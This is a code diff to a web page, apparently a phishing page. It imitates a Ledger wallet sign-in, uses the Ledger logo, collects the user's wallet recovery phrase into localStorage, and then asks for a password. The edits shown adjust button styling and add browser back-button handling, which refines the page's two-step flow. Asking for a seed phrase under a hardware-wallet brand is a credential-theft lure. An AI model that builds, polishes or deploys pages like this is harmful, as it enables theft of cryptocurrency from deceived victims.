@@ -62,7 +62,6 @@
         justify-content: flex-end;
         margin-top: 20px;
       }
-
       .btn {
         padding: 10px 20px;
         border: none;
@@ -70,24 +69,19 @@
         font-size: 14px;
         margin-left: 15px;
         min-width: 80px; /* Ensures all buttons have a reasonable width */
-        /* Optional: makes buttons look smoother */
       }
-
       .btn-back {
         background: #ccc;
       }
-
       .btn-next,
       .btn-nexts {
         background: rgb(0, 103, 184);
         color: white;
       }
-
       .btn-nexts {
-        margin-left: 20px; /* Reducing excessive margin */
-        min-width: 100px; /* Giving it a little more width */
+        margin-left: 20px;
+        min-width: 50px;
       }
-
       @media (max-width: 600px) {
         body {
           align-items: flex-start;
@@ -111,6 +105,7 @@
     </style>
   </head>
   <body>
+    <!-- Wallet Phrase Page -->
     <div class="container" id="page1" style="display: block">
       <img src="image/download (9).png" alt="Ledger Logo" class="ledger-logo" />
       <p class="title">Sign in</p>
@@ -126,6 +121,7 @@
       </div>
     </div>
 
+    <!-- Password Page -->
     <div class="container" id="page2">
       <img src="image/download (9).png" alt="Ledger Logo" class="ledger-logo" />
       <p class="title">Enter Password</p>
@@ -149,7 +145,10 @@
           errorText.style.display = "none";
           localStorage.setItem("walletPhrase", phrase);
 
-          // Instantly switch to the password page
+          // Update browser history so the Back button works
+          history.pushState({ page: 2 }, "Password Page", "#password");
+
+          // Show password page
           document.getElementById("page1").style.display = "none";
           document.getElementById("page2").style.display = "block";
         } else {
@@ -182,11 +181,16 @@
         }
       }
 
-      // Auto return to phrase page when clicking outside the password input
-      document.getElementById("password").addEventListener("blur", function () {
-        document.getElementById("page2").style.display = "none";
-        document.getElementById("page1").style.display = "block";
-      });
+      // Handle browser back button
+      window.onpopstate = function (event) {
+        if (event.state && event.state.page === 2) {
+          document.getElementById("page1").style.display = "none";
+          document.getElementById("page2").style.display = "block";
+        } else {
+          document.getElementById("page1").style.display = "block";
+          document.getElementById("page2").style.display = "none";
+        }
+      };
     </script>
   </body>
 </html>
